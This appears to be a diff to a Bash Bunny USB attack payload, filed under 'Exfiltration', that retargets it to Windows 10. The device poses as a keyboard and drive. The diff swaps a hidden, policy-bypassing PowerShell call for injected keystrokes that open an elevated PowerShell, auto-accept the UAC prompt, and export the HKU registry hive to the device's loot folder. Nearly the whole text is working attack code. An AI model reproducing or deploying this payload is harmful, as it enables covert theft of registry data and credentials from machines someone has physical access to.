@@ -3,7 +3,7 @@
 # Author:       Cribbit
 # Version:      1.0
 # Category:     Exfiltration
-# Target:       Windows 7+ (Powershell)
+# Target:       Windows 10 (Creators Update) (Powershell)
 # Attackmodes:	HID & STORAGE	
 # Config: 	Usesful root keys [ HKLM | HKCU | HKCR | HKU | HKCC ]
 
@@ -12,6 +12,12 @@ ATTACKMODE HID STORAGE
 
 LED ATTACK
 Q DELAY 200
-RUN WIN powershell -NoP -NonI -W Hidden -Exec Bypass ".(Reg EXPORT HKU ((gwmi win32_volume -f 'label=''BashBunny''').Name+'loot\\keys.reg'))"
-sleep 5
+REM RUN WIN powershell -NoP -NonI -W Hidden -Exec Bypass ".(Reg EXPORT HKU ((gwmi win32_volume -f 'label=''BashBunny''').Name+'loot\\keys.reg'))"
+Q GUI x
+Q STRING a
+Q DELAY 100
+Q ALT y
+Q DELAY 100
+Q STRING "Reg EXPORT HKU ((gwmi win32_volume -f 'label=''BashBunny''').Name+'loot\\keys1.reg') /y"
+Q ENTER 
 LED FINISH
